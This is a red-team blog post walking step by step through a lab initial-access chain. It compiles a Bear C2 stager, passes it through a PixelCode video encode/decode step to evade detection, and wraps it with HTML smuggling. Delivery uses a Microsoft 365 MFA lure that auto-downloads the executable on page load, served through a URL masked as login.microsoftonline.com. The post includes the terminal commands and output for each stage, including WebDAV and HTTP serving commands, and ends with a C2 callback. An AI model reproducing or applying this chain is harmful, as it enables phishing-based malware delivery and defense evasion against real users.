---
cover: ../.gitbook/assets/0c8bc6a3-3b68-4a79-8bb9-1b340924acac.png
coverY: 0
coverHeight: 301
---

# PixelCode Attack + HTML Smuggling Initial Access Chain

## Introduction :&#x20;

Hey everyone, welcome to this blog. In this one I want to cover another initial access chain I tried using Bear C2, this time combining the built-in PixelCode attack with HTML smuggling to deliver a beacon. I've been spending a lot of time with Bear C2 testing different things and this was one of the chains that worked well end to end.

## The Setup :&#x20;

* My lab for this was the same as the previous blog which is Windows 10 machine inside an Active Directory environment with Windows Defender enabled. Nothing turned off, nothing bypassed in advance as I wanted to see where the technique held up and where it didn't.

## What is the `PixelCode` Attack?

* The `PixelCode` attack encodes a binary's bytes into pixel values distributed across video frames and writes them out as a valid video file using `moviepy`. The output looks and behaves like a real MP4 as no appended data, no detectable anomaly at the container level, just a video file that scans clean because it is structurally a video.
* The important thing to understand here is that this happens entirely on the attacker side. The video is not delivered to the victim it is an intermediate obfuscation step. You encode your stager into `video.mp4`, then decode it back into a clean EXE using `Stager_PixelCode_To_Payload.py`, and that decoded EXE is what actually gets packaged and delivered. The victim machine never sees the video at all.
* The value of going through the encode and decode cycle is that the EXE you end up with comes out of a pixel reconstruction process rather than being your original compiled binary sitting on disk. When this is then wrapped in HTML smuggling for delivery, the payload never crosses the wire as a recognizable PE, the browser assembles it client side from base64 embedded in an HTML file.

## Tools :&#x20;

* **Bear C2 (**[**https://github.com/S3N4T0R-0X0/BEAR-C2**](https://github.com/S3N4T0R-0X0/BEAR-C2)**)** is an adversary simulation framework built by [S3N4TOR-0X0](https://www.linkedin.com/in/s3n4t0r/?lipi=urn%3Ali%3Apage%3Ad_flagship3_feed%3B67f9EiatRFKq8B1PIhMpkg%3D%3D) and it revolves around real world TTPs. It includes built in operator tooling such as Spear Phishing module, Script Obfuscator, PixelCode Attack, Host File management which makes it a solid framework for testing full delivery chains end to end. I've been running it extensively on my local lab instances and I'll be covering more of it in future posts.
* **SmuggleMyPayload (**[**https://github.com/shaheeryasirofficial/SmuggleMyPayload**](https://github.com/shaheeryasirofficial/SmuggleMyPayload)**)** developed by [Shaheer Yasir](https://www.linkedin.com/in/shaheer-yasir/?lipi=urn%3Ali%3Apage%3Ad_flagship3_feed%3B67f9EiatRFKq8B1PIhMpkg%3D%3D) handles the HTML smuggling side. It takes a payload, base64 encodes it, and wraps it in a generated HTML page with multiple delivery methods and several built-in lure templates Microsoft 365, DocuSign, OneDrive, SharePoint, Azure, which are ready to use out of the box.

## The Attack Chain :&#x20;

* Firstly, I started Bear C2 and configured a listener in Bear C2 with `HTTPS` and `AES` encryption on port `4321`. Bear C2 generates an Authentication ID at listener creation which gets compiled directly into the payload and ties the implant to that specific listener.

<figure><img src="../.gitbook/assets/image (152).png" alt=""><figcaption></figcaption></figure>

* Now, with the listener active, I compiled the stager from the Bear C2 stagers directory. It links against WinINet, Crypt32, and ws2\_32 and outputs a Windows PE  `HTTPS_AES.exe`.

<figure><img src="../.gitbook/assets/image (153).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (155).png" alt=""><figcaption></figcaption></figure>

* Now with the stager ready, I ran `Payload_To_PixelCode_video.py` and pointed it at `HTTPS_AES.exe`. The script encoded the binary's bytes into pixel values across video frames and wrote them out as `video.mp4` via moviepy.

<figure><img src="../.gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>

```
┌──(.venv)─(kali㉿kali)-[~/Downloads/BEAR-C2/Stagers-Loaders/PixelCode Attack]
└─$ python3 Payload_To_PixelCode_video.py
Convert file → video
Enter file path: /home/kali/Desktop/HTTPS_AES.exe
100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 3338/3338 [00:00<00:00, 4425.72KB/s]
Generating frames: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 211/211 [00:34<00:00,  6.13it/s]
MoviePy - Building video video.mp4.
MoviePy - Writing video video.mp4

MoviePy - Done !                                                                                                                                                                                                 
MoviePy - video ready video.mp4
Video generated successfully: video.mp4

```

* Then `Stager_PixelCode_To_Payload.py` reversed the process on the attacker machine and read the frames back, reconstructed the byte stream from the pixel block means, and wrote `Final_Result.exe`. This is what gets delivered to the victim. The `video.mp4` never  actually leaves the attacker machine, it served its purpose as an intermediate transformation step and that's it.

<figure><img src="../.gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>

```
┌──(.venv)─(kali㉿kali)-[~/Downloads/BEAR-C2/Stagers-Loaders/PixelCode Attack]
└─$ python3 Stager_PixelCode_To_Payload.py
```

* Now, With `Final_Result.exe` ready, I ran `SmuggleMyPayload.py` and pointed it at the decoded EXE. For the lure template I went with Microsoft 365 MFA Update and for delivery method I selected Auto-download on page load as there is no button, no click, and the file reconstructs and downloads the moment the page renders. The output was `smug_Final_Result.html` with the download filename set to `Final_Result.exe`.

<figure><img src="../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

```
┌──(kali㉿kali)-[~/Downloads/BEAR-C2/SmuggleMyPayload/Source]
└─$ python3 SmuggleMyPayload.py

  ╔══════════════════════════════════════════════╗                                                                                                                                                                
  ║                                              ║                                                                                                                                                                
  ║   SMUGGLE  MY  PAYLOAD                       ║                                                                                                                                                                
  ║   ───────────────────────────────────────    ║                                                                                                                                                                
  ║   HTML Smuggling Generator                   ║                                                                                                                                                                
  ║                                              ║                                                                                                                                                                
  ╚══════════════════════════════════════════════╝                                                                                                                                                                
                                                                                                                                                                                                                  
  Step 1 — Payload
  ──────────────────────────────────────────────────
  ? Path to payload file (ISO, ZIP, EXE, etc.): /home/kali/Desktop/Final_Result.exe
  ✓ Loaded: /home/kali/Desktop/Final_Result.exe (3.26 MB)
  ? Download filename (shown to victim) [Final_Result.exe]: 

  Encoding payload...  done
  Base64 size: 4450.8 KB

  Step 2 — Lure Template
  ──────────────────────────────────────────────────

  Select lure template:
    1) Microsoft 365 MFA Update
    2) DocuSign Document Ready
    3) SharePoint File Share
    4) OneDrive Secure Download
    5) Azure Portal Alert
    6) Generic Download Page
    7) Custom
  › 1
  ✓ Template: Microsoft 365 MFA Update

  Step 3 — Delivery Method
  ──────────────────────────────────────────────────

  Select delivery method:
    1) Click to download (button trigger)
    2) Click to download + JS obfuscation (recommended)
    3) Auto-download on page load
    4) Iframe blob delivery (extra layer)
  › 3
  ✓ Method: Auto-download on page load

  Step 4 — Output
  ──────────────────────────────────────────────────
  ? Output HTML file [smug_Final_Result.html]: 

  Generating...  done

  ──────────────────────────────────────────────────
  Output
  ──────────────────────────────────────────────────
  File     : smug_Final_Result.html
  Size     : 4455.5 KB
  Template : Microsoft 365 MFA Update
  Method   : Auto-download on page load
  Filename : Final_Result.exe
  ──────────────────────────────────────────────────

  Serve via WebDAV:
  cp smug_Final_Result.html /tmp/webdav-corp/
  wsgidav --host=0.0.0.0 --port=8888 --root=/tmp/webdav-corp --auth=anonymous &

  Serve via HTTP:
  python3 -m http.server 8080
```

* SmuggleMyPayload base64 encoded the payload and embedded it into the HTML with JavaScript handling the decode and download trigger entirely client-side. Nothing in the HTML file is a recognizable executable.
* Now for the Delivery I used Bear C2's Spear Phishing module served the HTML file on port 8080 and masked the URL behind `login.microsoftonline.com` with SSL handled automatically. I loaded `smug_Final_Result.html` through the module and started the server.

<figure><img src="../.gitbook/assets/image (160).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (161).png" alt=""><figcaption></figcaption></figure>

* When the target opened the URL, the page rendered as the MFA update lure and `Final_Result.exe` dropped to Downloads automatically and reconstructed in the browser, nothing flagged in transit.

<figure><img src="../.gitbook/assets/image (162).png" alt=""><figcaption></figcaption></figure>

* One thing to note here is that I also downloaded the `video.mp4` here but that is actually not required and it was just me trying to test different ways! 😅
* Then Executing `Final_Result.exe` produced an immediate callback in Bear C2.

<figure><img src="../.gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>

## Takeaway :&#x20;

* The chain works because each layer independently looks legitimate to whatever is inspecting it. The HTML file contains no binary. The URL looks like Microsoft. The payload only exists as a PE after the browser assembles it client-side at which point perimeter controls have already passed everything through.
* The PixelCode step is entirely on the attacker side and the victim never interacts with it. Its job is to produce a differently derived EXE from your original stager before you package it for delivery. Combined with HTML smuggling, what crosses the wire is just an HTML file and what the victim downloads is assembled in the browser. That's the chain.
* I'll keep testing different chains with Bear C2 and posting what works. More coming.
